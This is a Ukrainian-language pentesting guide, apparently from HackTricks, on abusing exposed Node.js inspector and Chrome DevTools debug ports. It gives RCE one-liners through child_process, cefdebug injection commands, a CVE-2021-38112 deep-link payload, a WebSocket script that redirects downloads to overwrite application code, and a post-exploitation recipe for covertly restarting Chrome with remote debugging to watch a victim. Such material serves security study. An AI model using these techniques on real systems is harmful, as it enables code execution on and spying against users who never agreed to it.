# Зловживання Node inspector/CEF debug

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

[З документації](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Під час запуску з перемикачем `--inspect` процес Node.js очікує на debugging client. **За замовчуванням** він прослуховує host і port **`127.0.0.1:9229`**. Кожному процесу також призначається **унікальний** **UUID**.<sup>[[4]](#references)</sup>

Inspector clients повинні знати й указати host address, port і UUID для підключення. Повний URL матиме приблизно такий вигляд: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Оскільки **debugger має повний доступ до execution environment Node.js**, зловмисник, який може підключитися до цього port, може виконати довільний code від імені процесу Node.js (**potential privilege escalation**).

Існує кілька способів запустити inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Коли ви запускаєте процес, який підлягає інспектуванню, з’явиться щось на кшталт цього:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Процеси на основі **CEF** (**Chromium Embedded Framework**) потребують параметра: `--remote-debugging-port=9222`, щоб відкрити **debugger** (захист від SSRF залишається дуже подібним). Однак замість надання сесії **debug** **NodeJS** вони взаємодіють із browser за допомогою [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), який є інтерфейсом для керування browser, але прямого RCE немає.<sup>[[5]](#references)</sup>

Коли ви запускаєте browser у режимі debug, з’явиться щось на кшталт цього:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets і same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Вебсайти, відкриті у web-браузері, можуть виконувати WebSocket- і HTTP-запити відповідно до моделі безпеки браузера. Необхідне **початкове HTTP-з'єднання**, щоб **отримати унікальний ідентифікатор сесії debugger**. **same-origin-policy** **перешкоджає** вебсайтам встановлювати **це HTTP-з'єднання**. Для додаткового захисту від [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js перевіряє, щоб **заголовки 'Host'** для з'єднання точно містили **IP-адресу**, **`localhost`** або **`localhost6`**.<sup>[[12]](#references)</sup>

> [!TIP]
> Ці **заходи безпеки перешкоджають експлуатації inspector** для виконання коду шляхом **простого надсилання HTTP-запиту** (що можна було б зробити, експлуатуючи SSRF vuln).

### Запуск inspector у запущених процесах

Ви можете надіслати **сигнал SIGUSR1** запущеному процесу nodejs, щоб змусити його **запустити inspector** на порту за замовчуванням. Однак зверніть увагу, що потрібно мати достатні привілеї, тому це може надати вам **привілейований доступ до інформації всередині процесу**, але не безпосереднє підвищення привілеїв.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Це корисно в контейнерах, оскільки **завершення процесу та запуск нового** з `--inspect` **неможливі**, адже **контейнер** буде **завершено** разом із процесом.

### Підключення до inspector/debugger

Щоб підключитися до **браузера на основі Chromium**, можна отримати доступ до URL `chrome://inspect` або `edge://inspect` для Chrome або Edge відповідно. Натиснувши кнопку Configure, слід переконатися, що **цільовий хост і порт** правильно вказані. На зображенні показано приклад Remote Code Execution (RCE):

![Після URL для доступу до debugger з'явиться такий запис, наприклад ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Підключення до inspector/debugger: Щоб підключитися до браузера на основі Chromium,...](<../../images/image (674).png>)

За допомогою **командного рядка** можна підключитися до debugger/inspector за допомогою:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Інструмент [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) дає змогу **знаходити інспектори**, що працюють локально, і **впроваджувати в них code**.<sup>[[1]](#references)[[2]](#references)[[11]](#references)[[13]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Зверніть увагу, що **RCE-експлойти для NodeJS не працюватимуть**, якщо підключитися до браузера через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (потрібно перевірити API, щоб знайти цікаві способи його використання).

## RCE у NodeJS Debugger/Inspector

> [!TIP]
> Якщо ви перейшли сюди, шукаючи спосіб отримати [**RCE з XSS в Electron, перегляньте цю сторінку.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Поширеним способом отримати **RCE**, коли ви можете **підключитися** до Node **inspector**, є використання чогось на кшталт наведеного нижче (схоже, що це **не працюватиме під час підключення до Chrome DevTools protocol**):<sup>[[3]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Ви можете переглянути API тут: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)<sup>[[5]](#references)</sup>\
У цьому розділі я просто перелічу цікаві речі, які, як я виявив, люди використовували для експлуатації цього протоколу.

### Parameter Injection via Deep Links

У [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security виявила, що application на основі CEF **зареєстрував користувацький UR**I у системі (workspaces://index.html), який отримував повний URI, а потім **запускав application на основі CEF** з конфігурацією, яка частково формувалася з цього URI.<sup>[[8]](#references)</sup>

Було виявлено, що параметри URI декодувалися з URL і використовувалися для запуску базового application на CEF, що дозволяло користувачу **інжектити** flag **`--gpu-launcher`** у **command line** та виконувати довільні дії.

Отже, payload на кшталт:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Виконає calc.exe.

### Перезапис файлів

Змініть папку, у якій **зберігатимуться завантажені файли**, і завантажте файл, щоб **перезаписати** часто використовуваний **вихідний код** застосунку своїм **шкідливим кодом**.<sup>[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE та exfiltration

Відповідно до цього допису: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) можна отримати RCE та exfiltrate внутрішні сторінки з theriver.<sup>[[9]](#references)[[10]](#references)</sup>

### Post-Exploitation

У реальному середовищі та **після компрометації** ПК користувача, який використовує браузер на основі Chrome/Chromium, можна запустити процес Chrome з **активованим debugging і виконати port-forward debugging-порту**, щоб отримати до нього доступ. Таким чином ви зможете **переглядати все, що жертва робить у Chrome, і викрадати чутливу інформацію**.<sup>[[7]](#references)</sup>

Найпотаємніший спосіб — **завершити кожен процес Chrome**, а потім викликати щось на кшталт
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Посилання

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - інструмент для інспекції та exploitation CEF/Chromium debugger](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution у Visual Studio Code через Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Посібник з debugging Node.js - Початок роботи](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusing Chrome's Debugging Feature to Observe and Control Browsing Sessions Remotely](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution у AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE через DNS Rebinding і CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - From Bot to RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)

{{#include ../../banners/hacktricks-training.md}}
